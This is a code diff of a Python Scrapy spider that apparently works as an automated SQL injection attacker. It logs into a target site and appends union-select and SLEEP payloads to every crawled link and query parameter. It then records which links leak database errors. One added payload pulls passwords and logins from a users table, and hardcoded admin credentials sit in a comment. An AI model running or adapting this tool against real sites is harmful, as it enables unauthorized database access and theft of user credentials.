@@ -20,32 +20,56 @@ error_payloads = ["+and+SLAP(10)+--+",
 					"+AND+SEELCT"]
 actual_payloads = ["%27+and+1=2+union+select+1,2,database%28%29,user%28%29,5,6,version%28%29,8,9,10,11,12+--+%20%3E%3E%2",
 "%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+",
-"%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29+--+"]
+"%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29+--+",
+"%20UNION%20ALL%20SELECT%201,2,3,password,5,6,login,8,9,10,11,12%20FROM%20users%20+--+",
+"%27+and+1=2+union+select+1,2,3+--+",
+"+and+SLEEP%2810%29+--+"
+]
 
 #links = open('links.txt','r')
 #print urls
 items = []
-fin = {}
+fin = []
 dic = {}
 tempResponse = ""
-searchterms = ["mysql error","sql syntax", "mysql server version", "unknown column","access violation","SQLSTATE", 
- "different number of columns","Cardinality violation"]
+searchterms = ["mysql error","sql syntax", "mysql server version", "unknown column","access violation","sqlstate", 
+ "different number of columns","cardinality violation","undefined index", "database.php"]
 
 class step3(Spider):
 	name = "step3"
+	
+	file4 = open("actualAttacks.txt","w")
+	file4.close()
+	"""
 	with open('Singleinput.json') as data_file:
 		data = json.load(data_file)
 	start_urls = [data['starturl']]
 	login_urls = [data['loginurl']]
 	login_user = [data['username']]
 	login_pass = [data['password']]
+	"""
+	main_file = open("Singleinput.json",'r')
+	infoList1 = json.load(main_file)
+	infoList = infoList1[0]
+	for key,value in infoList.iteritems():
+		start_urls =  [str(key)]
+		login_urls = [value[0].get("loginurl")]
+		login_user = [value[0].get("params")[0].get("username")]
+		login_pass = [value[0].get("params")[0].get("password")]
+		domain = start_urls[0][start_urls[0].find("//") + 2:len(start_urls[0])]
+	'''
+	start_urls = ["https://app4.com"]
+	login_urls = ["https://app4.com"]
+	login_user = ["admin@admin.com"]
+	login_pass = ["admin"]
+	'''
 	params = []
 	loginid = ""
 	passid = ""
 	login_reqd = "false"
 	links = open('linksToAttack.txt','w')
 
-	with open('data.json') as data_file:
+	with open('datalogin.json') as data_file:
 		data = json.load(data_file)
 
 	length = len(data)
@@ -58,9 +82,10 @@ class step3(Spider):
 	urls = links.readlines()
 
 	def parse(self, response):
+		print self.domain
 		for temp in self.urls:
 			login = "false"
-			if self.start_urls[0] in temp:
+			if self.domain in temp:
 				yield Request(url=temp, meta={'temp':temp, 'login':login} , callback=self.save_original_resp)
 				
 		#print response
@@ -82,20 +107,23 @@ class step3(Spider):
 		dispatcher.connect(self.spider_closed, signals.spider_closed)
 
 	def after_login(self, response):
+		f = open("res.html", "w")
+		f.write(response.body)
+		f.close()
 		login = response.request.meta['login']
  		if (((("ERROR: Invalid username") or ("The username/password combination you have entered is invalid"))	in response.body) or (response.url is self.start_urls[0])):
 			#self.log("Login failed", level=log.ERROR)
 			yield
 		# continue scraping with authenticated session...
 		else:
-			self.log("Login succeed!", level=log.DEBUG)
+			print "Login succeed!"
 			#print response.url
 			'''f = open("app4login.html", "w")
 			f.write(response.body)
 			f.close()'''
 			#print "response end!!\n"
 			for temp in self.urls:
-					if self.start_urls[0] in temp:
+					if self.domain in temp:
 							yield Request(url=temp, meta={'temp':temp, 'login':login} , callback=self.save_original_resp)
 			#file2 = open("vulnerableinks.txt","w")
 			#for item in items:
@@ -156,15 +184,35 @@ class step3(Spider):
 			if (temp not in items):
 					items.append(temp)
 					#UnionAndSelectAttacks
-					attackLink1 = temp+actual_payloads[0]
-					yield Request(attackLink1, meta={'temp':temp, 'original':original, 'login':login}, callback=self.actual_attack_resp)
-					attackLink2 = temp+actual_payloads[1]
-					yield Request(attackLink2, meta={'temp':temp, 'original':original, 'login':login}, callback=self.actual_attack_resp)
-					attackLink3 = temp+actual_payloads[2]
-					yield Request(attackLink3, meta={'temp':temp, 'original':original, 'login':login}, callback=self.actual_attack_resp)
-					file2 = open("vulnerableinks.txt","w")
-					file2.write(temp+"\n")
-					file2.close()
+					for actual_payload in actual_payloads:
+							attackLink = temp+actual_payload
+							yield Request(attackLink, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
+							file2 = open("vulnerableinks.txt","w")
+							file2.write(temp+"\n")
+							if "&" in temp:
+									queryVals = temp.split('&')
+									length = len(queryVals)
+									for i in range(0,length-1):
+											dupVals = copy.copy(queryVals);
+											dupVals[i] = dupVals[i]+actual_payload
+											finLink = "";
+											for i in range(0,length-1):
+													if i == 0:
+														finLink += dupVals[i]
+													else:
+														finLink += "&"+dupVals[i]
+											file2.write(finLink+"\n")
+											yield Request(finLink, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
+							file2.close()
+					#attackLink1 = temp+actual_payloads[0]
+					#yield Request(attackLink1, meta={'temp':temp, 'original':original, 'login':login}, callback=self.actual_attack_resp)
+					#attackLink2 = temp+actual_payloads[1]
+					#yield Request(attackLink2, meta={'temp':temp, 'original':original, 'login':login}, callback=self.actual_attack_resp)
+					#attackLink3 = temp+actual_payloads[2]
+					#yield Request(attackLink3, meta={'temp':temp, 'original':original, 'login':login}, callback=self.actual_attack_resp)
+					#file2 = open("vulnerableinks.txt","w")
+					#file2.write(temp+"\n")
+					#file2.close()
 		return
 
 	def actual_attack_resp(self, response):
@@ -177,7 +225,7 @@ class step3(Spider):
 		file4.write(response.url)
 		file4.close()
 		#print "#############################################"
-		if not attackResponse == original:
+		if not ( attackResponse == original or attackResponse == "" ):
 			if not any(term in response.body.lower() for term in searchterms):
 				file4 = open("actualAttacks.txt","a")
 				file4.write(response.url+"\n")
@@ -196,7 +244,7 @@ class step3(Spider):
 		return
 
 	def spider_closed(self, spider):
-		fin = dict(dic)
+		fin.append(dic)
 		f = open("step3output.json", 'w')
 		f.write(json.dumps(fin,indent= 4, sort_keys = True))
 		f.close()
